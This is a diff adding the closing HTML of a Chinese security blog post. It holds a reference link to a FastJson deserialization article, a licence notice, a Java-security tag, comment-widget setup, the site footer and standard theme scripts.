+<h3 id="参考文献">参考文献</h3>
+<p><a class="link" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C"  target="_blank" rel="noopener"
+    >FastJson与原生反序列化(二)</a></p>
+<h3 id="版权信息">版权信息</h3>
+<p>本文原载于<a class="link" href="https://0zhanya.github.io/"  target="_blank" rel="noopener"
+    >0ZHan&rsquo;s Blog</a>，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java%E5%AE%89%E5%85%A8/">Java安全</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji"],"lang":"zh-CN","locale":{"admin":"站长","sofa":"还没有人评论哦！快来抢沙发吧~"},"placeholder":"欢迎留下宝贵的评论！","requiredMeta":["name","email","url"],"serverURL":"https://data-table-e038f1l82-0zhanya.vercel.app/"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 0ZHan&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
